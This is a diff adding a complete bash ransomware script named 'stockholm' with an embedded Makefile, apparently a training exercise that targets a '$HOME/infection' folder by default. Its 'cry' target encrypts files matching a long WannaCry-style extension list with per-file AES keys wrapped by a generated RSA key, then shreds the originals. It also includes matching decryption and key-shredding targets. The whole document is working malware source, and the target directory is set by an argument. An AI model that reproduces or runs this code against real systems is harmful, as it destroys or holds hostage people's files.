@@ -1,0 +1,113 @@
+#!/usr/bin/bash
+show_help() {
+	echo "Usage: $0 [options]"
+	echo "Options:"
+	echo "  -h, --help          Show this help message"
+	echo "  -v, --version       Show version information"
+	echo "  -s, --silent        Silent mode"
+	echo "  -r, --reverse KEY   Decrypt files using the private key"
+	echo "  -t, --target DIR    Target directory"
+	echo "  -c, --clean         Clean up the infection"
+}
+show_version() {
+	echo "stockholm version 4.2"
+}
+silent=false
+reverse=false
+privkey=''
+target="$HOME/infection"
+validate_dir() {
+	if [ ! -d "$1" ]; then
+		echo "Error: Target directory: $1 does not exist" >&2
+		exit 1
+	fi
+}
+validate_key() {
+	if [ ! -f "$1" ]; then
+		echo "Error: Key file: $1 does not exist" >&2
+		exit 1
+	fi
+}
+while [[ "$#" -gt 0 ]]; do
+	case "$1" in
+		-h|--help) show_help; exit 0 ;;
+		-v|--version) show_version; exit 0 ;;
+		-s|--silent) silent=true ;;
+		-r|--reverse)
+			reverse=true; privkey="$2";
+			if [ -z "$privkey" ]; then
+				echo "Error: Private key is required for --reverse option" >&2
+				exit 1
+			fi
+			validate_key "$privkey"
+			shift ;;
+		-t|--target) target="$2"; shift ;;
+		-c|--clean) make -s -f <(grep -A4242 '^#!Makefile' "$0") clean TARGET="$target" S="$silent"; exit 0 ;;
+		*) echo "Unknown option: $1" >&2; show_help; exit 1 ;;
+	esac
+	shift
+done
+validate_dir "$target"
+if $reverse; then
+	[ "$silent" = false ] && echo "Wanna Decrypt"
+	make -s -f <(grep -A4242 '^#!Makefile' $0) uncry DKY_KEY="$privkey" TARGET="$target" S="$silent"
+else
+	[ "$silent" = false ] && echo "Cry"
+	make -s -f <(grep -A4242 '^#!Makefile' $0) cry TARGET="$target" S="$silent"
+fi
+exit 0
+#!Makefile
+RSA_KEY_SIZE = 4096
+KRY_KEY := ./public.pem
+DKY_KEY = ./private.pem
+TARGET := ./infection
+BCKP := ./backup.zip #mhm
+S := false
+EXT	:=	.123 .3ds .3g2 .3gp .602 .7z .ARC .PAQ .accdb .aes .ai .asc .asf \
+		.asm .asp .avi .backup .bak .bat .bmp .brd .bz2 .c .cgm .class .cmd \
+		.cpp .crt .cs .csr .csv .db .dbf .dch .dif .dip .djv .djvu .doc \
+		.docb .docm .docx .dot .dotm .dotx .dwg .edb .eml .fla .flv .frm \
+		.gif .gpg .gz .h .hwp .ibd .iso .jar .java .jpeg .jpg .js .key \
+		.lay .lay6 .ldf .m3u .m4u .max .mdb .mdf .mid .mkv .mml .mov \
+		.mp3 .mp4 .mpeg .mpg .msg .myd .myi .nef .odb .odg .odp .ods .odt \
+		.onetoc2 .ost .otg .otp .ots .ott .p12 .paq .pas .pdf .pem .pfx \
+		.php .pl .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm \
+		.pptx .ps1 .psd .pst .rar .raw .rb .rtf .sch .sh .sldm .sldx \
+		.slk .sln .snt .sql .sqlite3 .sqlitedb .stc .std .sti .stw .suo \
+		.svg .swf .sxc .sxd .sxi .sxm .sxw .tar .tbk .tgz .tif .tiff \
+		.txt .uop .uot .vb .vbs .vcd .vdi .vmdk .vmx .vob .vsd .vsdx \
+		.wav .wb2 .wk1 .wks .wma .wmv .xlc .xlm .xls .xlsb .xlsm .xlsx \
+		.xlt .xltm .xltx .xlw .zip
+.PHONY: cry uncry clean backup
+cry: $(KRY_KEY)
+	@$(foreach ext, $(EXT), \
+		find $(TARGET) -type f -iname "*$(ext)" -print0 | xargs -0 -P $$(nproc) -I {} bash -c \
+		'if [ ! -f "$$1.ft" ]; then \
+			[ "$(S)" = false ] && printf "Encrypting: %s\n" "$$1"; AES_KEY=$$(openssl rand -hex 32); \
+			if openssl enc -aes-256-cbc -salt -pbkdf2 -k "$$AES_KEY" -in "$$1" -out "$$1.enc" && \
+			echo -n "$$AES_KEY" | openssl pkeyutl -encrypt -pubin -inkey "$(KRY_KEY)" -out "$$1.key"; \
+			(echo "-----BEGIN ENCRYPTED FILE-----" && base64 < "$$1.key" && \
+			echo "-----END ENCRYPTED KEY-----" && base64 < "$$1.enc" && \
+			echo "-----END ENCRYPTED FILE-----") > "$$1.ft"; then shred -fun 4 -z "$$1" "$$1.key" "$$1.enc"; \
+			else shred -fun 2 -z "$$1.key" "$$1.enc"; [ "$(S)" = false ] && echo "Failed to encrypt: $$1" >&2; \
+			fi \
+		fi' _ {} \
+	;)
+uncry: $(DKY_KEY)
+	@find $(TARGET) -type f -name "*.ft" -print0 | xargs -0 -P $$(nproc) -I {} bash -c \
+		'[ "$(S)" = false ] && printf "Decrypting: %s\n" "$$1"; DkF="$$(echo "$$1" | sed s/.ft$$//)" && \
+		if [ ! -f "$$DkF" ]; then if awk "/-----BEGIN ENCRYPTED FILE-----/{f=1;next} /-----END ENCRYPTED KEY-----/{f=0} f" "$$1" | base64 -d > "$$1.key" && \
+			awk "/-----END ENCRYPTED KEY-----/{f=1;next} /-----END ENCRYPTED FILE-----/{f=0} f" "$$1" | base64 -d > "$$1.enc" && \
+			AES_KEY=$$(openssl pkeyutl -decrypt -inkey "$(DKY_KEY)" -in "$$1.key") && \
+			openssl enc -d -aes-256-cbc -pbkdf2 -k "$$AES_KEY" -in "$$1.enc" -out "$$DkF" 2>/dev/null; then shred -fun 2 -z "$$1" "$$1.key" "$$1.enc"; \
+		else shred -fun 2 -z "$$1.key" "$$1.enc"; [ "$(S)" = false ] && echo "Failed to decrypt: $$1" >&2; \
+		fi fi' _ {}
+clean:
+	@shred -fun 42 -z $(KRY_KEY) $(DKY_KEY)
+$(KRY_KEY):
+	@openssl genpkey -algorithm RSA -out $(DKY_KEY) -pkeyopt rsa_keygen_bits:$(RSA_KEY_SIZE)
+	@openssl rsa -in $(DKY_KEY) -pubout -out $(KRY_KEY) &>/dev/null
+backup: $(BCKP)
+	@echo "Backup created: $(BCKP)"
+$(BCKP):
+	@zip -r $(BCKP) $(TARGET)
